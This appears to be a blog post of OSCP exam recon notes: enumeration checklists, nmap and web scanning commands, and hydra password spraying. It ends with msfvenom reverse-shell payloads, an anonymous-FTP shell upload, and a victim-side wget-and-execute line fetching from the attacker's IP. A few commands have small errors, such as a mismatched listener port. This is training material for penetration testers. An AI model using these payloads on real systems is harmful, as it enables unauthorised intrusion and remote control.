I wanted to combine both notes with recon/methodology, and once you master that, this test becomes a bit easier. However, does this stop any rabbit holes? No, sadly. You can fall into a hole, but getting a method down quickly during recon helps. Stick to a checklist and stick to this diagram:

                   ┌──────────────────────────────────────────┐
                   │        1. INFORMATION GATHERING          │
                   │------------------------------------------│
                   │ - Identify scope                         │
                   │ - Discover live hosts                    │
                   │ - Enumerate open ports & services        │
                   └──────────────────────────────────────────┘
                                       │
                                       ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                         2. ENUMERATION                                  │
│-------------------------------------------------------------------------│
│ - Gather service details (versions, banners)                            │
│ - Inspect web apps, shares, endpoints                                   │
│ - Identify misconfigurations & exposed functionality                    │
└─────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
              ┌────────────────────────────────────────────────┐
              │             3. VULNERABILITY ANALYSIS          │
              │------------------------------------------------│
              │ - Map services to known weaknesses             │
              │ - Analyze configs, permissions, frameworks     │
              │ - Identify realistic attack paths              │
              └────────────────────────────────────────────────┘
                                       │
                                       ▼
      ┌────────────────────────────────────────────────────────────┐
      │                4. INITIAL ACCESS (FOOTHOLD)                │
      │------------------------------------------------------------│
      │ - Use legitimate testing methods to interact with targets  │
      │ - Leverage weaknesses found during enumeration             │
      │ - Gain low‑privilege shell or limited access               │
      └────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
         ┌────────────────────────────────────────────────────────┐
         │                 5. PRIVILEGE ESCALATION                │
         │--------------------------------------------------------│
         │ - Local enumeration                                    │
         │ - Identify misconfigurations, weak perms, credentials  │
         │ - Escalate to higher privilege levels                  │
         └────────────────────────────────────────────────────────┘
                                       │
                                       ▼
       ┌───────────────────────────────────────────────────────────────┐
       │                  6. POST-EXPLOITATION                         │
       │---------------------------------------------------------------│
       │ - Access proof files                                          │
       │ - Gather required information                                 │
       │ - No persistence or destructive actions (per exam rules)      │
       └───────────────────────────────────────────────────────────────┘

This is why it's great to stick to a checklist while doing the exam. Things to really check for:

☐ Host Discovery

nmap -sn <range> (safe ping sweep / ARP scan in scope)

☐ Full TCP Port Scan

Identify open services
Document everything
Re‑scan suspicious hosts if needed

☐ Service Version Detection

Map:

OS
service versions
protocols
banners



☐ Document:

Web ports (80/443/8080/etc.)
FTP/SMB/SSH/RDP
Database services
Anything uncommon

Web Recon:
☐ Identify Web Stack
Use whatweb or similar technology enumerators:

Frameworks (PHP, ASP.NET, Django, WordPress, etc.)
Server type (Apache, Nginx, IIS)
CMS platforms
Known plugins/extensions
Version fingerprints (if visible)

☐ Check SSL/TLS (optional)

Certificate info
Expiration
Hostnames/SAN entries

☐ Note any interesting headers

Cookies
Server banners
Security headers
File types

☐ Run directory/file enumeration

dirsearch (or similar) against each web port
Check common directories (admin, uploads, backups)
Note file extensions (*.php, *.asp, *.txt, .bak)

☐ Manually visit interesting findings

Login pages
Admin panels
Hidden directories
Publicly accessible scripts
Documentation pages

☐ Check Static Files

robots.txt
sitemap.xml
changelog/readme files
exposed backups (.zip, .tar, .old)

☐ Check for:

Login pages
Forgot‑password pages
Registration portals
File upload functionality
Search boxes
Filtering/sorting features
Cookies & session tokens
Parameterized URLs
Hidden form fields

☐ Static file review

JavaScript
Config hints embedded in comments
Hardcoded references
Deprecated routes

This step finds items that commonly lead to footholds when misconfigured.
☐ SMB / File Shares

Check shares listing
Look for accessible files
Misconfigurations
Anonymous access

☐ FTP

Anonymous login?
Publicly accessible directories?
Version info

☐ SSH

Banner information
Weak key reuse indicators
OS fingerprinting

☐ Databases

Versions
Public interfaces
Login prompts

☐ Web Applications

Form functionality
Input points
Sessions/cookies
Upload areas
API endpoints

Low hanging fruit:
☐ Common weak points:

Outdated web apps or frameworks
Exposed admin dashboards
Default/guest access
Misconfigured services
Info disclosure pages
Accessible shares with credentials
Backup files containing hints
Old versions with known issues
Unrestricted upload functionality

☐ Check version history

Compare discovered versions against publicly known issues
(Research only—no disallowed automation.)

This stage is about choosing a path, not executing it.
☐ Identify realistic footholds

Logic vulnerabilities
Authentication weaknesses
Misconfigurations
Poor access control
Exposed functionality
Version‑related issues

☐ Prioritize by:

Accessibility
Likelihood
Stability
Simplicity
OSCP scoring strategy

☐ Document chosen path

Why it’s likely
What evidence supports it
What next steps would be

These are all things to consider, and each is valid. I also wanted to have this written down so everyone can review it.

So add this to your notes:

Initial Recon & Access:
☐ Scan all TCP ports.
☐ Enumerate web server with all your relevant wordlists.
☐ Do proper fingerprinting with -sV -sC,  nmap vuln scan, wappalyzer, whatweb, check CMS, check server headers, nc -nvv, check every TCP port etc.
☐ Check for public exploits on exploitDB and google.
☐ Rescan if you're stuck, verify tools are working properly and you're running them properly.
☐ Check UDP ports.

Web Enumeration:
☐ Enumerate web server with all relevant wordlists (dirsearch/gobuster).
☐ Try multiple extensions: .php, .asp, .html, .txt, .bak.
☐ Identify tech using Wappalyzer, whatweb, webanalyze.
☐ Check for CMS (WordPress, Drupal, Joomla, etc.).
☐ Enumerate plugins/themes if CMS exists.
☐ Check robots.txt, sitemap.xml, changelog, readme, backup files.
☐ Inspect JavaScript sources for hidden paths.
☐ Look at default credentials lists for known web apps (safe research).
☐ Identify login panels, admin areas, upload features, API endpoints.
☐ Screenshot each interesting page.
☐ Check all response headers.
☐ Check verbose error messages or debug traces if present.
☐ Inspect API responses for hidden fields or metadata.
☐ Look for stack traces, server paths, or framework leaks.
☐ Check cookies for session type, flags, structure.
☐ Search for version numbers exposed in HTML comments.

Service Enumeration:
☐ For every open port: check banner, version, and basic functionality.
☐ Run nmap -sV -sC default scripts for initial coverage.
☐ Run nmap vuln scan (safe script categories only).
☐ Manually check banners with nc -nvv, telnet, curl, etc.
☐ Enumerate SMB shares (anonymous? listable?).
☐ Enumerate FTP (anonymous login? directory listing?).
☐ Enumerate SSH (banner, version, OS hints).
☐ Enumerate email services if present (POP3, IMAP, SMTP).
☐ Check for RPC, RDP, VNC, redis, memcached.
☐ Try safe SNMP enumeration if port 161 is open.
☐ Check for printers, cameras, or other unusual services.
☐ Perform version research for each exposed service.

Host:
☐ Identify login portals (SSH, RDP, Web UI).
☐ Enumerate potential username patterns from

File:
☐ Enumerate directories thoroughly (deep wordlist passes).
☐ Switch wordlists: small → medium → large → extensions → forced browsing.
☐ Look for:
Configuration files
Export logs
SQL dumps
Archive files
Admin tools
Hidden directories
☐ Explore every link, button, and form manually.

Low hanging fruit:
☐ Look for outdated CMS/framework versions.
☐ Look for anonymous/guest access on services.
☐ Look for open file shares with readable configs.
☐ Look for exposed backups (zip, tar, old files).
☐ Try safe upload test (file type + size constraints).
☐ Browse old endpoints (deprecated routes).
☐ Check for default admin pages.
☐ Check for password reuse indicators (username hints, comments).
☐ Check for open databases that accept connections but require no creds.
☐ Look for world‑readable directories or misconfigured shares.

Rescanning:
☐ Rescan if stuck—enumeration accuracy matters.
☐ Adjust Nmap timing (T2/T3 vs T4/T5 as appropriate).
☐ Try different scanners or wordlists.
☐ Validate that:

You used root/admin privileges where needed
Tools aren’t firewalled or timing out
Your VPN/connection is stable
☐ Re-run targeted scans on “weird” ports.
☐ Check for changes after interacting with services.

Mental OSCP Rules:
☐ Don’t jump machines randomly—finish full enumeration first.
☐ Document EVERYTHING, especially oddities.
☐ If stuck: redo your recon, expand your enumeration, and stay systematic.
☐ Remember: Enumeration → Enumeration → Enumeration.
☐ Identify the machine’s likely role (dev box, file server, CMS host).
☐ Infer the privilege model (is there a backend DB? AD? internal API?).
☐ Build a list of:
Potential misconfigurations
Weak authentication points
Development artifacts
Exposed internal logic
☐ Prioritize targets based on simplicity and feasibility.

I also know that AD needs to be enumerated, but that will be its own section. But all things need to be considered here initially: you will probably find an odd port and want to banner grab, check the website with common attacks, and fuzz where you can. For example, with LFI, can I see /etc/passwd, and then could I see someone’s SSH keys?
Get The Husky Hacker’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Really understanding the workflow and checking, hey, did I check for everything? That’s where a lot of people miss a step. Now, is this a lot? Yes, but think of it as a workflow rather than just checking the box. Your biggest enemy is time on the test.

This test is extremely time-consuming and methodologically demanding, so we are trying to reduce it. I made a few rules for myself:

Rule one:
nmap -sC -sV -p- --open $target -v --> regardless of tools, check what is open
you can come back to rustscan or autoscan, but know what is open on the host
sometimes you can good readings from this, sometimes, not, but run -v for 
verbose. You do not need to wait on scans!

Rule two:
When it comes to web enumeration, while nmap is running, you do not need 
to go onthe website! Run whatweb first!
whatweb $target or whatweb $target:port
Wapplzer is great, but this saves on time, and your still in the termnial. 
Banner grab with this tool. (subjective, some people are different though, 
I like whatweb since I stay in the console)

Rule three:
After whatweb, dirsearch, it comes with a prelist, and it works like gobuster. 
This just saves on time. However, everyone is different. A tool is a tool. 
But for me, running this:
dirsearch -u http://$target
You'll get what you need even while nmap is running.
other word lists works


Rule four:
Use netcat to banner grab your network ports! 
nc -nnv $target <port>
if you see port 21 first before port 80, then check port 21. 
if nmap is done, try this as well
nmap -sV -A -p <port> $target --script=banner
also don't be afraid to use telnet
telnet $target <port> -- for email, 25, you'll be doing a lot


Rule five:
simple, ignore ssh port until you need to use hydra for password spray, make 
this the bottom of the list, but still banner grab. You'll when to use it
if you found users and use rockyou, unless you find a hidden password list
hydra -L (or l for one users)  -P /usr/share/wordlist/rockyou.txt ssh://$target -V -e nsr -f -t 50 -K 


Rule six:
Don't rely on just TCP, run UDP too:
nmap -sU -p 53,161,137 $target -v or nmap -sV -sU -p- --open $target -v
remember, udp is connection less, it doesn't make the three way handshake
it will take awhile
really target port 161
nmap -sU -p 161 --script=snmp-info,snmp-interfaces,snmp-processes $target

Rule seven:
Assume you have anonymous/guest access for ports like 445/139, 21, 135
if you don't have it, check it off, that's not the way in
if you do, get everything from 21 and 445 from the share folder
also run this:
nmap -v -p 139,445 --script smb-os-discovery $target -v 
banner grab this 
RPC:
rpcclient -U “” -N $target
enumdomusers
srvinfo
querdispinfo

dump the users first if you can, if not banner grab, and come back with a user
however, its the only way to get in

Rule seven:
banner grab 25 with nc -nv $target 25
run VRFY root - if exist, cool, if not, there may be a user
test the connection as well
telnet aslo works
telnet $target 25

Rule eight:
if there is a metasploit option, the there is a github repo or database 
exploit number
 "exploit-db.com" is your friend
"" -name of the serivce check or thinking cve that might come to play


Rule nine: 
use metasploit on your last box. its ok if you haven't used it all on the test
but use it to save time if you are on your last box and you got 60 points
metasploit is only allowed once but use that one last time to get that passing 
grade. 

Rule 10: 
Take note of the name of the server too, this gives a hint about its functions. 
Like web-serv1 or mail-serv1

Rule 11:
keep a timer, and move yourself from your desk, take a break. Do it, 
don't get burnt out. 

Rule 12:
take every note, command, screen shot of success, not only its for the report
but something to get back to if your stuck.

Rule 13:
use burp for webbase attacks, unless you find someting you found

Once you have your access, it's just PrivEsc from there. A lot of this, besides the web enumeration being its own beast, depends on how much can you research. Sometimes, it's quick; sometimes it takes hours. Something to keep in mind: Capture the Flag tests are only meant for training, so they're not the real world. Now you don’t have to have this workflow. This is something I came up with in time. That’s why the more boxes you do, the more muscle memory it becomes.

Other great commands to run during recon:

nmap -Pn -sC -sV -p- --open -T4 $target -v  -oN nmap_TCPscan.txt

Rustscan:
https://github.com/bee-san/RustScan/wiki/Installation-Guide
rustscan -a 10.0.x.x/24 --ulimit 5000 -- -Pn 
rustscan -a $target --ulimit 5000 --A -sV 
rustscan -a $target --ulimit 5000

openssl s_client -connect $target:443

banner grab:

nc $target port
nc -zv $target <port> -manual enumeration
nc -nv $target <port>

curl -I http://$target
curl -kI http://$target

whatweb http://$target

Unicornscans is also a great tool 
sudo apt install unicornscan 
unicornscan -v -I -i <interface> -mT <target_IP_address_or_range>
Note: most likely use tun0

curl -I http://$target
curl -kI http://$target
curl -i http://$target/ -use and find the path of the search

add this as well when stuck
sudo echo “target ip domain.local" >> /etc/hosts
nmap -p 21 --script ftp-anon,ftp-syst,ftp-bounce $target
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN} $target
nmap -p 23 --script=telnet-brute,telnet-ntlm-info $target
nmap -p 22 -sV --script=ssh2-enum-alogs,ssh-hostkey $target
enum4linux-ng $target -- for 445/139 and 135

rpcclient -U “” -N $target
nmap -p 3389 --script=rdp-enum-encryption $target -- check rdp

FTP easy win:
With MS FTP:
Make the shell:
msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=443 -f asp > shell.aspx
nc -lvnp 433
ftp $target
anonymous
anonymous
put shell.aspx
ls (to check)
curl http://$target:21/shell.aspx 
check netcat 

Linux:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your_ip> LPORT=<port> -f elf > shell.elf
chmod +x shell.elf

python3 -m http.server 80

nc -lvnp <port>

on victim
wget http://<your_ip>/shell.elf -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell

for all things msfvenom
windows:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=<port> -f exe -O rev.exe

Linux:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your_ip> LPORT=<port> -f elf -o shell.elf
chmod shell.elf